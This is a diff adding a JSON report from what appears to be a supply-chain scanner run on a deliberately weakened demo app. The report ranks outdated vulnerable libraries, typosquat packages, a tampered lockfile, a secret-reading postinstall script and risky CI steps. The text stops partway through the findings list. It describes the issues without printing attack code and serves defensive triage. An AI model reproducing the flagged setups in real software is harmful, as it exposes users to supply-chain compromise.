@@ -1,0 +1,2611 @@
+{
+ "run_id": "d7c35427f51d",
+ "application": "sscg-demo-target",
+ "generated_at": "2026-11-24T03:48:35+00:00",
+ "exploitability_sources": {
+  "kev": {
+   "available": true,
+   "date": "2026-11-23T19:43:55.7979Z",
+   "entries": 1792
+  },
+  "epss": {
+   "available": true,
+   "date": "2026-11-23",
+   "scored_cves": 141,
+   "cves_queried": 141
+  }
+ },
+ "exposure": {
+  "network_service": true,
+  "evidence": [
+   "src/index.js:12 (Node HTTP server)",
+   "Dockerfile: EXPOSE 3000"
+  ]
+ },
+ "reachability_summary": {
+  "unknown": 6,
+  "imported": 8,
+  "transitive": 8,
+  "not_imported": 9
+ },
+ "priorities": [
+  {
+   "finding_id": "F-007",
+   "priority": "P0",
+   "score": 14.5,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "org.apache.logging.log4j:log4j-core@2.14.1: 8 known vulnerabilities (highest CRITICAL, CVSS 10.0)",
+   "category": "vulnerability",
+   "component": "org.apache.logging.log4j:log4j-core@2.14.1",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 10.0
+    },
+    "known_exploited": {
+     "value": "CVE-2021-44228, CVE-2021-45046",
+     "points": 2.5
+    },
+    "epss": {
+     "value": 0.99999,
+     "points": 1.0
+    },
+    "reachability": {
+     "value": "imported",
+     "points": 0.5
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 10.0",
+    "listed in CISA KEV: exploited in the wild, used in ransomware (+2.5)",
+    "EPSS 1.000 for CVE-2021-45105 (100% percentile) (+1)",
+    "imported by application code (notifier/src/main/java/com/acme/Notifier.java:2, notifier/src/main/java/com/acme/Notifier.java:4) (+0.5)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 2.25.4"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 10.0; listed in CISA KEV: exploited in the wild, used in ransomware (+2.5); EPSS 1.000 for CVE-2021-45105 (100% percentile) (+1); imported by application code (notifier/src/main/java/com/acme/Notifier.java:2, notifier/src/main/java/com/acme/Notifier.java:4) (+0.5); shipped in a network-facing service (+0.5); fix available: upgrade to >= 2.25.4",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-004",
+   "priority": "P0",
+   "score": 10.0,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "crossenv@7.0.3 is a documented malicious package",
+   "category": "anomaly",
+   "component": "crossenv@7.0.3",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 10.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 10.0",
+    "install-time risk: runs on every install, whether or not code imports it"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 10.0; install-time risk: runs on every install, whether or not code imports it",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-005",
+   "priority": "P0",
+   "score": 10.0,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "lodash@4.17.15: same version, different content hash (and source) in package-lock.json",
+   "category": "anomaly",
+   "component": "lodash@4.17.15",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 10.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 10.0",
+    "install-time risk: runs on every install, whether or not code imports it"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 10.0; install-time risk: runs on every install, whether or not code imports it",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-006",
+   "priority": "P0",
+   "score": 10.0,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "python3-dateutil@2.8.1 is a documented malicious package",
+   "category": "anomaly",
+   "component": "python3-dateutil@2.8.1",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 10.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 10.0",
+    "install-time risk: runs on every install, whether or not code imports it"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 10.0; install-time risk: runs on every install, whether or not code imports it",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-012",
+   "priority": "P0",
+   "score": 10.0,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "'crossenv' looks like the popular package 'cross-env'",
+   "category": "anomaly",
+   "component": "crossenv@7.0.3",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    },
+    "ai_triage": {
+     "value": "likely_malicious (high, deepseek:deepseek-flash)",
+     "points": 1.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0",
+    "install-time risk: runs on every install, whether or not code imports it",
+    "triage: likely malicious, high confidence (AI inference) (+1)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0; install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-013",
+   "priority": "P0",
+   "score": 10.0,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "'python3-dateutil' looks like the popular package 'python-dateutil'",
+   "category": "anomaly",
+   "component": "python3-dateutil@2.8.1",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    },
+    "ai_triage": {
+     "value": "likely_malicious (high, deepseek:deepseek-flash)",
+     "points": 1.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0",
+    "install-time risk: runs on every install, whether or not code imports it",
+    "triage: likely malicious, high confidence (AI inference) (+1)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0; install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-021",
+   "priority": "P0",
+   "score": 10.0,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "lodash@4.17.15: lockfile entry changed (resolved, integrity) but package.json still asks for '4.17.15'",
+   "category": "anomaly",
+   "component": "lodash@4.17.15",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    },
+    "ai_triage": {
+     "value": "likely_malicious (medium, deepseek:deepseek-flash)",
+     "points": 1.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0",
+    "install-time risk: runs on every install, whether or not code imports it",
+    "triage: likely malicious, medium confidence (AI inference) (+1)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0; install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, medium confidence (AI inference) (+1)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-033",
+   "priority": "P0",
+   "score": 7.5,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "new dev dependency crossenv@7.0.3 added in package.json",
+   "category": "anomaly",
+   "component": "crossenv@7.0.3",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.5
+    },
+    "ai_triage": {
+     "value": "likely_malicious (high, deepseek:deepseek-flash)",
+     "points": 1.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.5",
+    "triage: likely malicious, high confidence (AI inference) (+1)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 6.5; triage: likely malicious, high confidence (AI inference) (+1)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-034",
+   "priority": "P0",
+   "score": 7.5,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "new prod dependency python3-dateutil@2.8.1 added in worker/requirements.txt",
+   "category": "anomaly",
+   "component": "python3-dateutil@2.8.1",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.5
+    },
+    "ai_triage": {
+     "value": "likely_malicious (high, deepseek:deepseek-flash)",
+     "points": 1.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.5",
+    "triage: likely malicious, high confidence (AI inference) (+1)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 6.5; triage: likely malicious, high confidence (AI inference) (+1)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-041",
+   "priority": "P0",
+   "score": 5.0,
+   "urgent": true,
+   "bucket": "fix now",
+   "title": "crossenv@7.0.3 runs an install script (code not inspected)",
+   "category": "anomaly",
+   "component": "crossenv@7.0.3",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 4.0
+    },
+    "ai_triage": {
+     "value": "likely_malicious (high, deepseek:deepseek-flash)",
+     "points": 1.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 4.0",
+    "install-time risk: runs on every install, whether or not code imports it",
+    "triage: likely malicious, high confidence (AI inference) (+1)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 4.0; install-time risk: runs on every install, whether or not code imports it; triage: likely malicious, high confidence (AI inference) (+1)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-011",
+   "priority": "P0",
+   "score": 10.8,
+   "urgent": false,
+   "bucket": "fix now",
+   "title": "pyyaml@5.3.0: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)",
+   "category": "vulnerability",
+   "component": "pyyaml@5.3.0",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.8
+    },
+    "epss": {
+     "value": 0.0624,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "imported",
+     "points": 0.5
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.8",
+    "EPSS 0.062 for CVE-2020-14343 (94% percentile)",
+    "imported by application code (worker/app.py:3) (+0.5)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 5.4"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.8; EPSS 0.062 for CVE-2020-14343 (94% percentile); imported by application code (worker/app.py:3) (+0.5); shipped in a network-facing service (+0.5); fix available: upgrade to >= 5.4",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-001",
+   "priority": "P0",
+   "score": 10.5,
+   "urgent": false,
+   "bucket": "fix now",
+   "title": "'postinstall' script scripts/setup.js runs shell commands / child processes, reads secrets from the environment, hides data with base64, fingerprints the host / user",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 10.0
+    },
+    "ai_triage": {
+     "value": "suspicious (medium, deepseek:deepseek-flash)",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 10.0",
+    "install-time risk: runs on every install, whether or not code imports it",
+    "triage: suspicious, medium confidence (AI inference) (+0.5)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 10.0; install-time risk: runs on every install, whether or not code imports it; triage: suspicious, medium confidence (AI inference) (+0.5)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-009",
+   "priority": "P1",
+   "score": 10.3,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "minimist@0.0.8: 2 known vulnerabilities (highest CRITICAL, CVSS 9.8)",
+   "category": "vulnerability",
+   "component": "minimist@0.0.8",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.8
+    },
+    "epss": {
+     "value": 0.04581,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "transitive",
+     "points": 0.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.8",
+    "EPSS 0.046 for CVE-2021-44906 (92% percentile)",
+    "pulled in by an imported dependency (potentially reachable)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 0.2.4"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.8; EPSS 0.046 for CVE-2021-44906 (92% percentile); pulled in by an imported dependency (potentially reachable); shipped in a network-facing service (+0.5); fix available: upgrade to >= 0.2.4",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-023",
+   "priority": "P1",
+   "score": 10.1,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "axios@0.21.0: 25 known vulnerabilities (highest HIGH, CVSS 8.6)",
+   "category": "vulnerability",
+   "component": "axios@0.21.0",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 8.6
+    },
+    "epss": {
+     "value": 0.1228,
+     "points": 0.5
+    },
+    "reachability": {
+     "value": "imported",
+     "points": 0.5
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 8.6",
+    "EPSS 0.123 for CVE-2026-44492 (96% percentile) (+0.5)",
+    "imported by application code (src/index.js:4) (+0.5)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 0.33.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 8.6; EPSS 0.123 for CVE-2026-44492 (96% percentile) (+0.5); imported by application code (src/index.js:4) (+0.5); shipped in a network-facing service (+0.5); fix available: upgrade to >= 0.33.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-002",
+   "priority": "P1",
+   "score": 10.0,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": ".github/workflows/ci.yml: 'pull_request_target' workflow checks out the pull request's own code",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 10.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 10.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 10.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-003",
+   "priority": "P1",
+   "score": 10.0,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": ".github/workflows/ci.yml: secret(s) NPM_TOKEN are passed to a downloaded script",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 10.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 10.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 10.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-024",
+   "priority": "P1",
+   "score": 9.6,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "jinja2@2.10.0: 6 known vulnerabilities (highest HIGH, CVSS 8.6)",
+   "category": "vulnerability",
+   "component": "jinja2@2.10.0",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 8.6
+    },
+    "epss": {
+     "value": 0.03603,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "imported",
+     "points": 0.5
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 8.6",
+    "EPSS 0.036 for CVE-2019-10906 (90% percentile)",
+    "imported by application code (worker/app.py:4) (+0.5)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 3.1.6"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 8.6; EPSS 0.036 for CVE-2019-10906 (90% percentile); imported by application code (worker/app.py:4) (+0.5); shipped in a network-facing service (+0.5); fix available: upgrade to >= 3.1.6",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-025",
+   "priority": "P1",
+   "score": 9.6,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "lodash@4.17.15: 5 known vulnerabilities (highest HIGH, CVSS 8.1)",
+   "category": "vulnerability",
+   "component": "lodash@4.17.15",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 8.1
+    },
+    "epss": {
+     "value": 0.20158,
+     "points": 0.5
+    },
+    "reachability": {
+     "value": "imported",
+     "points": 0.5
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 8.1",
+    "EPSS 0.202 for CVE-2021-23337 (98% percentile) (+0.5)",
+    "imported by application code (src/index.js:3) (+0.5)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 4.18.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 8.1; EPSS 0.202 for CVE-2021-23337 (98% percentile) (+0.5); imported by application code (src/index.js:3) (+0.5); shipped in a network-facing service (+0.5); fix available: upgrade to >= 4.18.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-018",
+   "priority": "P1",
+   "score": 9.5,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e (\"chore: routine dependency refresh\")",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    },
+    "ai_triage": {
+     "value": "suspicious (high, deepseek:deepseek-flash)",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0",
+    "triage: suspicious, high confidence (AI inference) (+0.5)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0; triage: suspicious, high confidence (AI inference) (+0.5)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-019",
+   "priority": "P1",
+   "score": 9.5,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "image fastbuilds42/node:latest is not an official / verified-publisher image (docker.io/fastbuilds42/node)",
+   "category": "anomaly",
+   "component": "fastbuilds42/node:latest",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    },
+    "ai_triage": {
+     "value": "suspicious (high, deepseek:deepseek-flash)",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0",
+    "triage: suspicious, high confidence (AI inference) (+0.5)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0; triage: suspicious, high confidence (AI inference) (+0.5)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-020",
+   "priority": "P1",
+   "score": 9.5,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "lodash@4.17.15 is downloaded from npm-mirror.example.invalid, not the npm registry",
+   "category": "anomaly",
+   "component": "lodash@4.17.15",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    },
+    "ai_triage": {
+     "value": "suspicious (high, deepseek:deepseek-flash)",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0",
+    "install-time risk: runs on every install, whether or not code imports it",
+    "triage: suspicious, high confidence (AI inference) (+0.5)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0; install-time risk: runs on every install, whether or not code imports it; triage: suspicious, high confidence (AI inference) (+0.5)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-010",
+   "priority": "P1",
+   "score": 9.3,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "org.apache.commons:commons-text@1.9: 1 known vulnerability (highest CRITICAL, CVSS 9.8)",
+   "category": "vulnerability",
+   "component": "org.apache.commons:commons-text@1.9",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.8
+    },
+    "epss": {
+     "value": 0.99931,
+     "points": 1.0
+    },
+    "reachability": {
+     "value": "not_imported",
+     "points": -2.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.8",
+    "EPSS 0.999 for CVE-2022-42889 (100% percentile) (+1)",
+    "not imported by application code (-2)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 1.10.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.8; EPSS 0.999 for CVE-2022-42889 (100% percentile) (+1); not imported by application code (-2); shipped in a network-facing service (+0.5); fix available: upgrade to >= 1.10.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-014",
+   "priority": "P1",
+   "score": 9.0,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": ".github/workflows/ci.yml: job 'build' downloads a script and pipes it into a shell",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-015",
+   "priority": "P1",
+   "score": 9.0,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": ".github/workflows/ci.yml: third-party action 'fastbuilds42/cache-helper@main' is not pinned to a commit SHA",
+   "category": "anomaly",
+   "component": "fastbuilds42/cache-helper@main",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-016",
+   "priority": "P1",
+   "score": 9.0,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": ".github/workflows/ci.yml: workflow token has 'permissions: write-all'",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-017",
+   "priority": "P1",
+   "score": 9.0,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "Dockerfile downloads a script and pipes it into a shell",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-008",
+   "priority": "P1",
+   "score": 8.8,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "com.fasterxml.jackson.core:jackson-databind@2.9.8: 60 known vulnerabilities (highest CRITICAL, CVSS 9.8)",
+   "category": "vulnerability",
+   "component": "com.fasterxml.jackson.core:jackson-databind@2.9.8",
+   "factors": {
+    "initial_risk": {
+     "value": "Critical",
+     "points": 9.8
+    },
+    "epss": {
+     "value": 0.45205,
+     "points": 0.5
+    },
+    "reachability": {
+     "value": "not_imported",
+     "points": -2.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 9.8",
+    "EPSS 0.452 for CVE-2019-12384 (99% percentile) (+0.5)",
+    "not imported by application code (-2)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 2.18.11"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 9.8; EPSS 0.452 for CVE-2019-12384 (99% percentile) (+0.5); not imported by application code (-2); shipped in a network-facing service (+0.5); fix available: upgrade to >= 2.18.11",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-026",
+   "priority": "P1",
+   "score": 8.5,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "follow-redirects@1.13.0: 5 known vulnerabilities (highest HIGH, CVSS 8.0)",
+   "category": "vulnerability",
+   "component": "follow-redirects@1.13.0",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 8.0
+    },
+    "epss": {
+     "value": 0.02608,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "transitive",
+     "points": 0.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 8.0",
+    "EPSS 0.026 for CVE-2022-0155 (86% percentile)",
+    "pulled in by an imported dependency (potentially reachable)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 1.16.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 8.0; EPSS 0.026 for CVE-2022-0155 (86% percentile); pulled in by an imported dependency (potentially reachable); shipped in a network-facing service (+0.5); fix available: upgrade to >= 1.16.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-028",
+   "priority": "P1",
+   "score": 8.5,
+   "urgent": false,
+   "bucket": "fix this sprint",
+   "title": "requests@2.19.1: 5 known vulnerabilities (highest HIGH, CVSS 7.5)",
+   "category": "vulnerability",
+   "component": "requests@2.19.1",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 7.5
+    },
+    "epss": {
+     "value": 0.06925,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "imported",
+     "points": 0.5
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 7.5",
+    "EPSS 0.069 for CVE-2018-18074 (94% percentile)",
+    "imported by application code (worker/app.py:2) (+0.5)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 2.33.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 7.5; EPSS 0.069 for CVE-2018-18074 (94% percentile); imported by application code (worker/app.py:2) (+0.5); shipped in a network-facing service (+0.5); fix available: upgrade to >= 2.33.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-029",
+   "priority": "P2",
+   "score": 8.0,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "urllib3@1.23.0: 12 known vulnerabilities (highest HIGH, CVSS 7.5)",
+   "category": "vulnerability",
+   "component": "urllib3@1.23.0",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 7.5
+    },
+    "epss": {
+     "value": 0.02922,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "transitive",
+     "points": 0.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 7.5",
+    "EPSS 0.029 for CVE-2026-21441 (87% percentile)",
+    "pulled in by an imported dependency (potentially reachable)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 2.8.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 7.5; EPSS 0.029 for CVE-2026-21441 (87% percentile); pulled in by an imported dependency (potentially reachable); shipped in a network-facing service (+0.5); fix available: upgrade to >= 2.8.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-022",
+   "priority": "P2",
+   "score": 7.3,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "node-fetch@2.6.0: 2 known vulnerabilities (highest HIGH, CVSS 8.8)",
+   "category": "vulnerability",
+   "component": "node-fetch@2.6.0",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 8.8
+    },
+    "epss": {
+     "value": 0.01778,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "not_imported",
+     "points": -2.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 8.8",
+    "EPSS 0.018 for CVE-2022-0235 (79% percentile)",
+    "not imported by application code (-2)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 2.6.7"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 8.8; EPSS 0.018 for CVE-2022-0235 (79% percentile); not imported by application code (-2); shipped in a network-facing service (+0.5); fix available: upgrade to >= 2.6.7",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-031",
+   "priority": "P2",
+   "score": 7.0,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "acme-orders@1.0.0 runs a 'postinstall' script on every install: node scripts/setup.js",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.5
+    },
+    "ai_triage": {
+     "value": "suspicious (medium, deepseek:deepseek-flash)",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.5",
+    "install-time risk: runs on every install, whether or not code imports it",
+    "triage: suspicious, medium confidence (AI inference) (+0.5)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 6.5; install-time risk: runs on every install, whether or not code imports it; triage: suspicious, medium confidence (AI inference) (+0.5)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-035",
+   "priority": "P2",
+   "score": 7.0,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "new prod dependency urllib3@2.8.0 added in worker/requirements.txt",
+   "category": "anomaly",
+   "component": "urllib3@2.8.0",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.5
+    },
+    "ai_triage": {
+     "value": "suspicious (medium, deepseek:deepseek-flash)",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.5",
+    "triage: suspicious, medium confidence (AI inference) (+0.5)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 6.5; triage: suspicious, medium confidence (AI inference) (+0.5)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-037",
+   "priority": "P2",
+   "score": 6.7,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "idna@2.7.0: 2 known vulnerabilities (highest MEDIUM, CVSS 6.2)",
+   "category": "vulnerability",
+   "component": "idna@2.7.0",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.2
+    },
+    "epss": {
+     "value": 0.01386,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "transitive",
+     "points": 0.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.2",
+    "EPSS 0.014 for CVE-2024-3651 (73% percentile)",
+    "pulled in by an imported dependency (potentially reachable)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 3.15"
+   ],
+   "unknowns": [],
